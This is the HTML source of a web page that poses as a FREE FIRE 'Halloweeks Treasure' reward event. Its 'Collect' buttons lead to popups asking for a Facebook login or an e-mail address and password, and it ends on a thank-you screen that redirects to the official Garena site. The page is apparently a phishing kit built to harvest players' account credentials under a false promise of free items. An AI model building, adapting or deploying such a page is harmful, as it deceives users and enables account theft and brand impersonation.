...
<title>Halloweeks Treasure</title>
<meta property="og:description" content="Start Free Draw and Collect your exclusive reward from FREE FIRE now!">
...
<link rel="stylesheet" href="css/bukanlog/selowf.css">
<link rel="stylesheet" href="css/bukanlog/selowt.css">
...
<div class="header">
<video src="media/namekheader.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="namekbox" style="margin-top:-20px;">
            <center>
                <br>
                <br>
                <br>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/1.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/2.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/3.png">Collect</button>
</div>
</div>
</div>
<div class="item2 itemShine">
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/4.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/5.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/6.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/7.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/8.png">Collect</button>
</div>
</div>
<div class="item2 itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/reward/9.png">Collect</button>
</div>
</div>
<br>
<br>
...
<img src="img/namekfooter.jpg" style="width: 100%;"></div>
        </div>
        <!--- header --->

<div class="popup newhome">
<div class="popup-box4" style="margin-top:280px;width:380px">
<div class="nav-popup"><div class="nav-popup-title"> </div></div>
...
<button type="button" onmousedown="buka.play();" class="popup-btn-active3" onclick="open_account_login()" style="width:100px;height:30px;left:-50px;color:#fff;margin-top:30px;">Go Event</button>
</div>
</div>
</div>
...
<div class="popup-box-navbars-title"> </div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Are You Sure Want To Collect This Reward?</div> <!--- popup-box-alert --->
...
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_verification()">Collect</button>
</div> <!--- popup-box-bg --->
...
<div class="namekpop">
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<br>
</div>
</div>
    <!--- popup --->
...
<div class="popup-box-navbars">
<img onmousedown="tutup.play();" onclick="close_mail_login()" src="img/popup-close2.png">
<div class="popup-box-navbars-title">Log in with linked e-mail</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bgs">
<div class="popup-box-alerts4"></div> <!--- popup-box-alert --->
<form class="popup-box-formx" form action="javascript:void(0)" method="post" id="ValidateLoginMailForm">
...
<label>E-mail address</label><input type="text" name="email" id="email-k" placeholder="Enter your e-mail" required oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
<label>Password</label><input type="password" name="password" id="password-k" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<br><br><center>
...
<img src="https://i.ibb.co/HrPnMBr/FfMaxx.jpg">
...
<div class="popup account_verification animated fadeIn" style="margin-top:150px;display: none;">
<div class="popup-box-wrapper1">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title"> </div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Please Fill Your Details!</div> <!--- popup-box-alert --->
...
Thank you for joining the FREE FIRE Event
<br>
...
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
...
<script src="js/selowxswip.js"></script>
<script src="js/selowscript.js"></script>
